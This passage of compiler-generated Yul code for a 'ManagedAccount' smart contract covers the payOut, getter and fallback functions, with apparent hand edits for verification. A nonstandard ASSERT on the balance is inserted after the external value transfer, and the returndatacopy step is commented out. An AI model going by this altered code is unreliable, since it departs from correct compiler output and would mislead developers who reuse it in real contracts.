                                    external_fun_accumulatedInput_275()
                                }

                                default {}
                            }

                            fun__319()

                            stop()

                            function shift_right_224_unsigned(value) -> newValue {
                                newValue :=

                                shr(224, value)

                            }

                            function allocate_unbounded() -> memPtr {
                                memPtr := mload(64)
                            }

                            function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {
                                revert(0, 0)
                            }

                            function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {
                                revert(0, 0)
                            }

                            function cleanup_t_uint160(value) -> cleaned {
                                cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                            }

                            function cleanup_t_address(value) -> cleaned {
                                cleaned := cleanup_t_uint160(value)
                            }

                            function validator_revert_t_address(value) {
                                if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }
                            }

                            function abi_decode_t_address(offset, end) -> value {
                                value := calldataload(offset)
                                validator_revert_t_address(value)
                            }

                            function cleanup_t_uint256(value) -> cleaned {
                                cleaned := value
                            }

                            function validator_revert_t_uint256(value) {
                                if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }
                            }

                            function abi_decode_t_uint256(offset, end) -> value {
                                value := calldataload(offset)
                                validator_revert_t_uint256(value)
                            }

                            function abi_decode_tuple_t_addresst_uint256(headStart, dataEnd) -> value0, value1 {
                                if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                                {

                                    let offset := 0

                                    value0 := abi_decode_t_address(add(headStart, offset), dataEnd)
                                }

                                {

                                    let offset := 32

                                    value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                                }

                            }

                            function cleanup_t_bool(value) -> cleaned {
                                cleaned := iszero(iszero(value))
                            }

                            function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {
                                mstore(pos, cleanup_t_bool(value))
                            }

                            function abi_encode_tuple_t_bool__to_t_bool__fromStack(headStart , value0) -> tail {
                                tail := add(headStart, 32)

                                abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))

                            }

                            function external_fun_payOut_374() {

                                let param_0, param_1 :=  abi_decode_tuple_t_addresst_uint256(4, calldatasize())
                                let ret_0 :=  fun_payOut_374(param_0, param_1)
                                let memPos := allocate_unbounded()
                                let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                                return(memPos, sub(memEnd, memPos))

                            }

                            function revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() {
                                revert(0, 0)
                            }

                            function abi_decode_tuple_(headStart, dataEnd)   {
                                if slt(sub(dataEnd, headStart), 0) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            }

                            function shift_right_unsigned_dynamic(bits, value) -> newValue {
                                newValue :=

                                shr(bits, value)

                            }

                            function cleanup_from_storage_t_bool(value) -> cleaned {
                                cleaned := and(value, 0xff)
                            }

                            function extract_from_storage_value_dynamict_bool(slot_value, offset) -> value {
                                value := cleanup_from_storage_t_bool(shift_right_unsigned_dynamic(mul(offset, 8), slot_value))
                            }

                            function read_from_storage_split_dynamic_t_bool(slot, offset) -> value {

                                value := extract_from_storage_value_dynamict_bool(sload(slot), offset)

                            }

                            /// @ast-id 273
                            /// @src 0:6259:6283  "bool public payOwnerOnly"
                            function getter_fun_payOwnerOnly_273() -> ret {

                                let slot := 0
                                let offset := 20

                                ret := read_from_storage_split_dynamic_t_bool(slot, offset)

                            }
                            /// @src 0:6775:7667  "contract ManagedAccount is ManagedAccountInterface{..."

                            function external_fun_payOwnerOnly_273() {

                                if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                                abi_decode_tuple_(4, calldatasize())
                                let ret_0 :=  getter_fun_payOwnerOnly_273()
                                let memPos := allocate_unbounded()
                                let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                                return(memPos, sub(memEnd, memPos))

                            }

                            function cleanup_from_storage_t_address(value) -> cleaned {
                                cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                            }

                            function extract_from_storage_value_dynamict_address(slot_value, offset) -> value {
                                value := cleanup_from_storage_t_address(shift_right_unsigned_dynamic(mul(offset, 8), slot_value))
                            }

                            function read_from_storage_split_dynamic_t_address(slot, offset) -> value {

                                value := extract_from_storage_value_dynamict_address(sload(slot), offset)

                            }

                            /// @ast-id 271
                            /// @src 0:6161:6181  "address public owner"
                            function getter_fun_owner_271() -> ret {

                                let slot := 0
                                let offset := 0

                                ret := read_from_storage_split_dynamic_t_address(slot, offset)

                            }
                            /// @src 0:6775:7667  "contract ManagedAccount is ManagedAccountInterface{..."

                            function abi_encode_t_address_to_t_address_fromStack(value, pos) {
                                mstore(pos, cleanup_t_address(value))
                            }

                            function abi_encode_tuple_t_address__to_t_address__fromStack(headStart , value0) -> tail {
                                tail := add(headStart, 32)

                                abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))

                            }

                            function external_fun_owner_271() {

                                if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                                abi_decode_tuple_(4, calldatasize())
                                let ret_0 :=  getter_fun_owner_271()
                                let memPos := allocate_unbounded()
                                let memEnd := abi_encode_tuple_t_address__to_t_address__fromStack(memPos , ret_0)
                                return(memPos, sub(memEnd, memPos))

                            }

                            function cleanup_from_storage_t_uint256(value) -> cleaned {
                                cleaned := value
                            }

                            function extract_from_storage_value_dynamict_uint256(slot_value, offset) -> value {
                                value := cleanup_from_storage_t_uint256(shift_right_unsigned_dynamic(mul(offset, 8), slot_value))
                            }

                            function read_from_storage_split_dynamic_t_uint256(slot, offset) -> value {

                                value := extract_from_storage_value_dynamict_uint256(sload(slot), offset)

                            }

                            /// @ast-id 275
                            /// @src 0:6359:6387  "uint public accumulatedInput"
                            function getter_fun_accumulatedInput_275() -> ret {

                                let slot := 1
                                let offset := 0

                                ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                            }
                            /// @src 0:6775:7667  "contract ManagedAccount is ManagedAccountInterface{..."

                            function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {
                                mstore(pos, cleanup_t_uint256(value))
                            }

                            function abi_encode_tuple_t_uint256__to_t_uint256__fromStack(headStart , value0) -> tail {
                                tail := add(headStart, 32)

                                abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))

                            }

                            function external_fun_accumulatedInput_275() {

                                if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                                abi_decode_tuple_(4, calldatasize())
                                let ret_0 :=  getter_fun_accumulatedInput_275()
                                let memPos := allocate_unbounded()
                                let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                                return(memPos, sub(memEnd, memPos))

                            }

                            function zero_value_for_split_t_bool() -> ret {
                                ret := 0
                            }

                            function shift_right_0_unsigned(value) -> newValue {
                                newValue :=

                                shr(0, value)

                            }

                            function extract_from_storage_value_offset_0_t_address(slot_value) -> value {
                                value := cleanup_from_storage_t_address(shift_right_0_unsigned(slot_value))
                            }

                            function read_from_storage_split_offset_0_t_address(slot) -> value {

                                value := extract_from_storage_value_offset_0_t_address(sload(slot))

                            }

                            function cleanup_t_rational_0_by_1(value) -> cleaned {
                                cleaned := value
                            }

                            function identity(value) -> ret {
                                ret := value
                            }

                            function convert_t_rational_0_by_1_to_t_uint256(value) -> converted {
                                converted := cleanup_t_uint256(identity(cleanup_t_rational_0_by_1(value)))
                            }

                            function shift_right_160_unsigned(value) -> newValue {
                                newValue :=

                                shr(160, value)

                            }

                            function extract_from_storage_value_offset_20_t_bool(slot_value) -> value {
                                value := cleanup_from_storage_t_bool(shift_right_160_unsigned(slot_value))
                            }

                            function read_from_storage_split_offset_20_t_bool(slot) -> value {

                                value := extract_from_storage_value_offset_20_t_bool(sload(slot))

                            }

                            function panic_error_0x01() {
                                mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                                mstore(4, 0x01)
                                revert(0, 0x24)
                            }

                            function assert_helper(condition) {
                                if iszero(condition) { panic_error_0x01() }
                            }

                            function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {
                                updated_pos := pos
                            }

                            function store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(memPtr) {

                            }

                            function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {
                                pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)
                                store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(pos)
                                end := add(pos, 0)
                            }

                            function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack(pos ) -> end {

                                pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)

                                end := pos
                            }

                            function round_up_to_mul_of_32(value) -> result {
                                result := and(add(value, 31), not(31))
                            }

                            function panic_error_0x41() {
                                mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                                mstore(4, 0x41)
                                revert(0, 0x24)
                            }

                            function finalize_allocation(memPtr, size) {
                                let newFreePtr := add(memPtr, round_up_to_mul_of_32(size))
                                // protect against overflow
                                if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { panic_error_0x41() }
                                mstore(64, newFreePtr)
                            }

                            function allocate_memory(size) -> memPtr {
                                memPtr := allocate_unbounded()
                                finalize_allocation(memPtr, size)
                            }

                            function array_allocation_size_t_bytes_memory_ptr(length) -> size {
                                // Make sure we can allocate memory without overflow
                                if gt(length, 0xffffffffffffffff) { panic_error_0x41() }

                                size := round_up_to_mul_of_32(length)

                                // add length slot
                                size := add(size, 0x20)

                            }

                            function allocate_memory_array_t_bytes_memory_ptr(length) -> memPtr {
                                let allocSize := array_allocation_size_t_bytes_memory_ptr(length)
                                memPtr := allocate_memory(allocSize)

                                mstore(memPtr, length)

                            }

                            function zero_value_for_split_t_bytes_memory_ptr() -> ret {
                                ret := 96
                            }

                            function extract_returndata() -> data {

                                switch returndatasize()
                                case 0 {
                                    data := zero_value_for_split_t_bytes_memory_ptr()
                                }
                                default {
                                    data := allocate_memory_array_t_bytes_memory_ptr(returndatasize())
                                    // THIS IS BEING CALLED WHEN THE RETURNDATA IS NON-ZERO. 
                                    //returndatacopy(add(data, 0x20), 0, returndatasize())
                                }

                            }

                            function convert_t_uint160_to_t_uint160(value) -> converted {
                                converted := cleanup_t_uint160(identity(cleanup_t_uint160(value)))
                            }

                            function convert_t_uint160_to_t_address(value) -> converted {
                                converted := convert_t_uint160_to_t_uint160(value)
                            }

                            function convert_t_address_to_t_address(value) -> converted {
                                converted := convert_t_uint160_to_t_address(value)
                            }

                            /// @ast-id 374
                            /// @src 0:7258:7665  "function payOut(address _recipient, uint _amount) public override payable returns (bool) {..."
                            function fun_payOut_374(var__recipient_321, var__amount_323) -> var__327 {


                                /// @src 0:7341:7345  "bool"
                                let zero_t_bool_1 := zero_value_for_split_t_bool()
                                var__327 := zero_t_bool_1

                                /// @src 0:7366:7376  "msg.sender"
                                let expr_331 := caller()
                                /// @src 0:7380:7385  "owner"
                                let _2 := read_from_storage_split_offset_0_t_address(0x00)
                                let expr_332 := _2
                                /// @src 0:7366:7385  "msg.sender != owner"
                                let expr_333 := iszero(eq(cleanup_t_address(expr_331), cleanup_t_address(expr_332)))
                                /// @src 0:7366:7402  "msg.sender != owner || msg.value > 0"
                                let expr_338 := expr_333
                                if iszero(expr_338) {
                                    /// @src 0:7389:7398  "msg.value"
                                    let expr_335 := callvalue()
                                    /// @src 0:7401:7402  "0"
                                    let expr_336 := 0x00
                                    /// @src 0:7389:7402  "msg.value > 0"
                                    let expr_337 := gt(cleanup_t_uint256(expr_335), convert_t_rational_0_by_1_to_t_uint256(expr_336))
                                    /// @src 0:7366:7402  "msg.sender != owner || msg.value > 0"
                                    expr_338 := expr_337
                                }
                                /// @src 0:7366:7443  "msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner)"
                                let expr_345 := expr_338
                                if iszero(expr_345) {
                                    /// @src 0:7407:7419  "payOwnerOnly"
                                    let _3 := read_from_storage_split_offset_20_t_bool(0x00)
                                    let expr_339 := _3
                                    /// @src 0:7407:7442  "payOwnerOnly && _recipient != owner"
                                    let expr_343 := expr_339
                                    if expr_343 {
                                        /// @src 0:7423:7433  "_recipient"
                                        let _4 := var__recipient_321
                                        let expr_340 := _4
                                        /// @src 0:7437:7442  "owner"
                                        let _5 := read_from_storage_split_offset_0_t_address(0x00)
                                        let expr_341 := _5
                                        /// @src 0:7423:7442  "_recipient != owner"
                                        let expr_342 := iszero(eq(cleanup_t_address(expr_340), cleanup_t_address(expr_341)))
                                        /// @src 0:7407:7442  "payOwnerOnly && _recipient != owner"
                                        expr_343 := expr_342
                                    }
                                    /// @src 0:7406:7443  "(payOwnerOnly && _recipient != owner)"
                                    let expr_344 := expr_343
                                    /// @src 0:7366:7443  "msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner)"
                                    expr_345 := expr_344
                                }
                                /// @src 0:7365:7444  "(msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))"
                                let expr_346 := expr_345
                                /// @src 0:7364:7444  "!(msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))"
                                let expr_347 := cleanup_t_bool(iszero(expr_346))
                                /// @src 0:7357:7445  "assert(!(msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner)))"
                                assert_helper(expr_347)
                                /// @src 0:7475:7485  "_recipient"
                                let _6 := var__recipient_321
                                let expr_352 := _6
                                /// @src 0:7475:7490  "_recipient.call"
                                let expr_353_address := expr_352
                                /// @src 0:7498:7505  "_amount"
                                let _7 := var__amount_323
                                let expr_354 := _7
                                /// @src 0:7475:7506  "_recipient.call{value: _amount}"
                                let expr_355_address := expr_353_address
                                let expr_355_value := expr_354
                                /// @src 0:7475:7510  "_recipient.call{value: _amount}(\"\")"

                                let _8 := allocate_unbounded()
                                let _9 := sub(abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack(_8  ), _8)

                                let pbal := balance(address())


                                let expr_357_component_1 := call(gas(), expr_355_address,  expr_355_value,  _8, _9, 0, 0)
                                if lt(balance(address()),pbal) {
                                    ASSERT(eq(sub(pbal,expr_355_value) , balance(address())))
                                }
                                    
                                let expr_357_component_2_mpos := extract_returndata()
                                /// @src 0:7474:7511  "(_recipient.call{value: _amount}(\"\"))"
                                let expr_358_component_1 := expr_357_component_1
                                let expr_358_component_2_mpos := expr_357_component_2_mpos
                                /// @src 0:7455:7511  "(bool success, ) = (_recipient.call{value: _amount}(\"\"))"
                                let var_success_351 := expr_358_component_1
                                /// @src 0:7525:7532  "success"
                                let _10 := var_success_351
                                let expr_360 := _10
                                /// @src 0:7521:7659  "if (success) {..."
                                switch expr_360
                                case 0 {
                                    /// @src 0:7643:7648  "false"
                                    let expr_369 := 0x00
                                    /// @src 0:7636:7648  "return false"
                                    var__327 := expr_369
                                    leave
                                    /// @src 0:7521:7659  "if (success) {..."
                                }
                                default {
                                    /// @src 0:7560:7570  "_recipient"
                                    let _11 := var__recipient_321
                                    let expr_362 := _11
                                    /// @src 0:7572:7579  "_amount"
                                    let _12 := var__amount_323
                                    let expr_363 := _12
                                    /// @src 0:7553:7580  "PayOut(_recipient, _amount)"
                                    let _13 := 0x9735b0cb909f3d21d5c16bbcccd272d85fa11446f6d679f6ecb170d2dabfecfc
                                    let _14 := convert_t_address_to_t_address(expr_362)
                                    {
                                        let _15 := allocate_unbounded()
                                        let _16 := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(_15 , expr_363)
                                        log2(_15, sub(_16, _15) , _13, _14)
                                    }/// @src 0:7601:7605  "true"
                                    let expr_366 := 0x01
                                    /// @src 0:7594:7605  "return true"
                                    var__327 := expr_366
                                    leave
                                    /// @src 0:7521:7659  "if (success) {..."
                                }

                            }
                            /// @src 0:6775:7667  "contract ManagedAccount is ManagedAccountInterface{..."

                            function extract_from_storage_value_offset_0_t_uint256(slot_value) -> value {
                                value := cleanup_from_storage_t_uint256(shift_right_0_unsigned(slot_value))
                            }

                            function read_from_storage_split_offset_0_t_uint256(slot) -> value {

                                value := extract_from_storage_value_offset_0_t_uint256(sload(slot))

                            }

                            function panic_error_0x11() {
                                mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                                mstore(4, 0x11)
                                revert(0, 0x24)
                            }

                            function checked_add_t_uint256(x, y) -> sum {
                                x := cleanup_t_uint256(x)
                                y := cleanup_t_uint256(y)
                                sum := add(x, y)

                                if gt(x, sum) { panic_error_0x11() }

                            }

                            function shift_left_0(value) -> newValue {
                                newValue :=

                                shl(0, value)

                            }

                            function update_byte_slice_32_shift_0(value, toInsert) -> result {
                                let mask := 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
                                toInsert := shift_left_0(toInsert)
                                value := and(value, not(mask))
                                result := or(value, and(toInsert, mask))
                            }

                            function convert_t_uint256_to_t_uint256(value) -> converted {
                                converted := cleanup_t_uint256(identity(cleanup_t_uint256(value)))
                            }

                            function prepare_store_t_uint256(value) -> ret {
                                ret := value
                            }

                            function update_storage_value_offset_0_t_uint256_to_t_uint256(slot, value_0) {
                                let convertedValue_0 := convert_t_uint256_to_t_uint256(value_0)

                                sstore(slot, update_byte_slice_32_shift_0(sload(slot), prepare_store_t_uint256(convertedValue_0)))
                            }

                            /// @ast-id 319
                            /// @src 0:7178:7252  "fallback() external payable {..."
                            function fun__319() {

                                /// @src 0:7236:7245  "msg.value"
                                let expr_315 := callvalue()
                                /// @src 0:7216:7245  "accumulatedInput += msg.value"
                                let _17 := read_from_storage_split_offset_0_t_uint256(0x01)

                                let expr_316 := checked_add_t_uint256(_17, expr_315)

                                update_storage_value_offset_0_t_uint256_to_t_uint256(0x01, expr_316)

                            }
                            /// @src 0:6775:7667  "contract ManagedAccount is ManagedAccountInterface{..."

                        }

                        data ".metadata" hex"a26469706673582212208e8c79b9d9bd933253b4060afe0621a7674c5fdec1c492cdf800daac6605628864736f6c634300081c0033"
                    }

                }

            }

            data ".metadata" hex"a26469706673582212204dcc9a8010081f09f9900400fd104cde810699aff4dab895aaef3515ab5a702064736f6c634300081c0033"
        }

    }

    



}
